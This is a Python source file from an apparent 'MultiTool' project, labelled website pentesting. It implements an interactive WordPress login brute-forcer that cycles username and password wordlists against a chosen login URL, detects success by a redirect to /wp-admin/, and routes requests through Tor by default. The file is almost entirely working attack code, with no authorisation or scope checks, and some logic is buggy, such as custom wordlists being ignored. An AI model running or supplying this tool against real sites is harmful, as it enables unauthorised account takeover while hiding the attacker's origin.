"""
@MultiTool / Website Pentesting
@Version 1.0
@Python 3.10.12
"""
import time
from rich.progress import Progress
#
from src.modules.logger import (LOGGER,Fore)
import src.modules.http_request_handler as req_handler
#

class WEBSITE_PENTESTING(LOGGER):
    def __init__(self,timezone:str,network_tool) -> None:
        (self.timezone,self.network_tool) = (timezone,network_tool)
        super().__init__()
        # WordPress-Login-Bruteforce
        self.wait_between_requests:float = 1.1 # seconds
        self.wordpress_redirect_url_part:str = "/wp-admin/" # after a successfull login
        self.default_wordpress_pwd_wordlist_filepath:str = "src/tools/website_pentesting/wordlists/default_wordpress_pwd_wordlist.txt"
        self.default_wordpress_user_wordlist_filepath:str = "src/tools/website_pentesting/wordlists/default_wordpress_user_wordlist.txt"
        self.default_username_fieldname:str = "username"
        self.default_pwd_fieldname:str = "pwd"
        #
        self.use_tor_status:bool = True
    
    def check_url(self,url:str) -> bool:
        try:
            session = req_handler.create_new_session(use_proxy=self.use_tor_status,fake_header=True)
            resp = session.get(url)                
            session.close()
            if resp.status_code == 200:
                return True
        except Exception as _error:
            self.failed(),self.error(str(_error))
        return False
    
    def check_wordlist(self,wordlist_filepath:str) -> bool:
        try:
            if len(wordlist_filepath) == 0:
                raise Exception("")
            file = open(wordlist_filepath,'r')
            Lines = file.readlines()
            file.close()
            del Lines
            return True
        except Exception as _error:
            return False
    
    def try_wordpress_login(self,pwd_wordlist:str,user_wordlist:str,login_url:str,username_fieldname:str,pwd_fieldname:str,username:str="") -> tuple((bool,str)):
        self.info(f"You can skip this Attack by typing {Fore.LIGHTMAGENTA_EX}CTRL+C")
        try:
            try:
                resp:str = ""
                error_counter:int = 0
                session = req_handler.create_new_session(use_proxy=self.use_tor_status)
                pwd_wordlist_file = open(pwd_wordlist,'r')
                PWD_Lines = pwd_wordlist_file.readlines()
                pwd_wordlist_file.close()
                if len(PWD_Lines) == 0:
                    self.error("Password-Wordlist is empty!")
                    return
                if len(username) == 0:
                    user_wordlist_file = open(user_wordlist,'r')
                    USER_Lines = user_wordlist_file.readlines()
                    user_wordlist_file.close()
                    if len(USER_Lines) == 0:
                        self.error("Username-Wordlist is empty!")
                        return
                    self.info(f"Trying {len(USER_Lines)} usenames with {len(PWD_Lines)} passwords")
                    with Progress() as progress:
                        task1 = progress.add_task("[cyan] Try usernames", total=len(USER_Lines))
                        task2 = progress.add_task("[purple] Try passwords", total=len(PWD_Lines))
                        while not progress.finished:
                            for user in USER_Lines:
                                user = user.strip()
                                progress.reset(task2)
                                progress.update(task1, advance=1)
                                for pwd in PWD_Lines:
                                    pwd = pwd.strip()
                                    (status,response) = req_handler.post(session=session,url=login_url,payload={
                                        username_fieldname:user,pwd_fieldname:pwd
                                    })
                                    if status == True:
                                        if response.status_code != 200:
                                            self.warning(f"Response-Code: {response.status_code}")
                                        if response.is_redirect:
                                            self.info(f"Redirect to {Fore.LIGHTCYAN_EX}{response.url}{Fore.RESET} for the credentials {username}:{pwd}")
                                            if self.wordpress_redirect_url_part in response.url:
                                                resp = f"Found possible correct credentials: {Fore.LIGHTYELLOW}{user}:{pwd}"
                                                self.info(resp)
                                                continue_qu:str = str(input(Fore.WHITE+"<"+"Continue? [Y/n]> "+Fore.RESET))
                                                if continue_qu.lower().strip() == "n":
                                                    progress.stop()
                                                    break
                                    else:
                                        self.error(f"An error occured while trying '{user}:{pwd}' as credentials: {response}")
                                        error_counter += 1
                                        session = req_handler.create_new_session(use_proxy=self.use_tor_status)
                                    if error_counter == 3:
                                        progress.stop()
                                        raise Exception("Too many errors. Stopping Bruteforce-Attack")
                                    progress.update(task2, advance=1)
                                    time.sleep(self.wait_between_requests)
                else:
                    self.info(f"Trying {username} with {len(PWD_Lines)} passwords")
                    with Progress() as progress:
                        task1 = progress.add_task("[purple] Try passwords", total=len(PWD_Lines))
                        while not progress.finished:
                            for pwd in PWD_Lines:
                                pwd = pwd.strip()
                                (status,response) = req_handler.post(session=session,url=login_url,payload={
                                    username_fieldname:username,pwd_fieldname:pwd
                                })
                                if status == True:
                                    if response.status_code != 200:
                                        self.warning(f"Response-Code: {response.status_code}")
                                    if response.is_redirect:
                                        self.info(f"Redirect to {Fore.LIGHTCYAN_EX}{response.url}{Fore.RESET} for the credentials {username}:{pwd}")
                                        if self.wordpress_redirect_url_part in response.url:
                                            resp = f"Found possible correct credentials: {Fore.LIGHTYELLOW}{username}:{pwd}"
                                            self.info(resp)
                                            continue_qu:str = str(input(Fore.WHITE+"<"+"Continue? [Y/n]> "+Fore.RESET))
                                            if continue_qu.lower().strip() == "n":
                                                progress.stop()
                                                break
                                else:
                                    self.error(f"An error occured while trying '{username}:{pwd}' as credentials: {response}")
                                    error_counter += 1
                                if error_counter == 3:
                                    progress.stop()
                                    raise Exception("Too many errors. Stopping Bruteforce-Attack")                                    
                                progress.update(task1, advance=1)
                                time.sleep(self.wait_between_requests)
                session.close()
            except KeyboardInterrupt:
                raise Exception("Detected Keyboard-Interruption")
        except Exception as _error:
            return (False,f"An error occured: {str(_error)}")
        return (True,resp)
        
    def wordpress_login_bruteforce(self) -> None:
        login_url:str = str(input(Fore.WHITE+"<"+"Login-URL> "+Fore.RESET))
        if len(login_url) <= 1:
            self.error(f"The WordPress-Login-URL '{login_url}' is invalid!")
            return
        username_fieldname:str = str(input(Fore.WHITE+"<"+f"Username-Fieldname [Default='{self.default_username_fieldname}']> "+Fore.RESET))
        if len(username_fieldname) == 0:
            username_fieldname = self.default_username_fieldname
        pwd_fieldname:str = str(input(Fore.WHITE+"<"+f"Password-Fieldname [Default='{self.default_pwd_fieldname}']> "+Fore.RESET))
        if len(pwd_fieldname) == 0:
            pwd_fieldname = self.default_pwd_fieldname
        if len(login_url) <= 1:
            self.error(f"The WordPress-Login-URL '{login_url}' is invalid!")
            return
        use_tor:str = str(input(Fore.WHITE+"<"+"Use Tor-Proxy? [Y/n]> "+Fore.RESET))
        if use_tor.strip().lower() == "n":
            self.use_tor_status = False
            self.warning("You're not using any proxy to connect with the target-website!")
        self.info("Check if website is reachable",prog=True)
        if self.check_url(login_url):
            self.ok()
            if "wp-login.php" not in login_url or ".php" not in login_url:
                self.error("The login-page doesn't look like, that it's using WordPress")
                return
            username_known_qu:str = str(input(Fore.WHITE+"<"+"Do you know the username? [y/N]> "+Fore.RESET))
            wordpress_username:str = ""
            if username_known_qu.lower().strip() == "y":
                username:str = str(input(Fore.WHITE+"<"+"Enter the username> "+Fore.RESET))
                if len(username) > 0:
                    wordpress_username = username
            self.info(f"Start Bruteforce-Attack at {Fore.LIGHTBLUE_EX}{login_url}{Fore.RESET}")
            if len(wordpress_username) == 0:
                self.info(f"Try default-WordPress-Usernames '{self.default_wordpress_user_wordlist_filepath}'")
            self.info(f"Try default-WordPress-Passwords '{self.default_wordpress_pwd_wordlist_filepath}'")
            (found,resp) = self.try_wordpress_login(
                pwd_wordlist=self.default_wordpress_pwd_wordlist_filepath,
                user_wordlist=self.default_wordpress_user_wordlist_filepath,
                username=wordpress_username,
                login_url=login_url,
                username_fieldname=username_fieldname,
                pwd_fieldname=pwd_fieldname
            )
            if found:
                self.found(resp)
                return
            else:
                if "error" not in resp:
                    self.info(resp)
                elif "error" in resp and "Keyboard-Interruption":
                    self.warning(resp)
                else:
                    self.error(resp)
                    return
            continue_qu:str = str(input(Fore.WHITE+"<"+"Continue? [Y/n]> "+Fore.RESET))
            if continue_qu.lower().strip() == "n":
                self.info("Stopped Bruteforce-Attack.")
                return
            if len(wordpress_username) == 0:
                username_wordlist_filepath:str = str(input(Fore.WHITE+"<"+"Username-Wordlist-Filepath> "+Fore.RESET))
                if self.check_wordlist(username_wordlist_filepath):
                    pwd_wordlist_filepath:str = str(input(Fore.WHITE+"<"+"Password-Wordlist-Filepath> "+Fore.RESET))
                    if self.check_wordlist(pwd_wordlist_filepath):
                        self.info(f"Start Bruteforce-Attack at {Fore.LIGHTBLUE_EX}{login_url}{Fore.RESET} with custom wordlists")
                        (found,resp) = self.try_wordpress_login(
                            pwd_wordlist=self.default_wordpress_pwd_wordlist_filepath,
                            user_wordlist=self.default_wordpress_user_wordlist_filepath,
                            username=wordpress_username,
                            login_url=login_url,
                            username_fieldname=username_fieldname,
                            pwd_fieldname=pwd_fieldname
                        )
                        if found:
                            self.found(resp)
                            return
                        else:
                            if "error" not in resp:
                                self.info(resp)
                            elif "error" in resp and "Keyboard-Interruption":
                                self.warning(resp)
                            else:
                                self.error(resp)
                    else:
                        self.error("The provided wordlist is invalid!")
                else:
                    self.error("The provided wordlist is invalid!")
        else:
            self.failed(),self.error("An error occured while trying to connect with target-website")
            return
        self.use_tor_status = True # return to default